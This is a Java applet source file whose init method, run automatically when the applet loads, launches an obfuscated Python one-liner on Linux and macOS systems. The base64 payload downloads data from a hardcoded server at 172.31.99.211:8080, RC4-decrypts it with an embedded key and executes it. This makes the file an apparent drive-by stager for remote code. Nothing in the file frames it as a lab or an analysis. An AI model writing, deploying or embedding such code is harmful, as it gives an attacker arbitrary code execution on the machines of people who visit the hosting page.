import java.applet.*;
import java.awt.*;
import java.io.*;
import java.util.*;

public class Java extends Applet {

    private Object initialized = null;
    public Object isInitialized()
    {
        return initialized;
    }

    public void init() 
    {

        try {

            PrintWriter writer = new PrintWriter("/tmp/status2", "UTF-8");
            writer.println("starting");
            writer.close();

            String os = System.getProperty("os.name").toLowerCase();

            if  (os.indexOf( "win" ) >= 0)
            {
                // skip Windows
            }
            else {
                // Linux/OSX

                // PrintWriter writer = new PrintWriter("/tmp/status", "UTF-8");
                // writer.println("starting");
                // writer.close();

                Process f = Runtime.getRuntime().exec("python -c \"import sys,base64;exec(base64.b64decode('R3BmZHhiUUQ9J2ZMZk1ZRScKaW1wb3J0IHN5cywgdXJsbGliMjtvPV9faW1wb3J0X18oezI6J3VybGxpYjInLDM6J3VybGxpYi5yZXF1ZXN0J31bc3lzLnZlcnNpb25faW5mb1swXV0sZnJvbWxpc3Q9WydidWlsZF9vcGVuZXInXSkuYnVpbGRfb3BlbmVyKCk7VUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztvLmFkZGhlYWRlcnM9WygnVXNlci1BZ2VudCcsVUEpXTthPW8ub3BlbignaHR0cDovLzE3Mi4zMS45OS4yMTE6ODA4MC9pbmRleC5hc3AnKS5yZWFkKCk7a2V5PScyYzEwM2YyYzRlZDFlNTljMGI0ZTJlMDE4MjE3NzBmYSc7UyxqLG91dD1yYW5nZSgyNTYpLDAsW10KZm9yIGkgaW4gcmFuZ2UoMjU2KToKICAgIGo9KGorU1tpXStvcmQoa2V5W2klbGVuKGtleSldKSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKG9yZChjaGFyKV5TWyhTW2ldK1Nbal0pJTI1Nl0pKQpleGVjKCcnLmpvaW4ob3V0KSk='));\"");

                f.waitFor();
                initialized = this;
            }

        }
        catch (Exception exception)
        {
            exception.printStackTrace();
        }
    }
}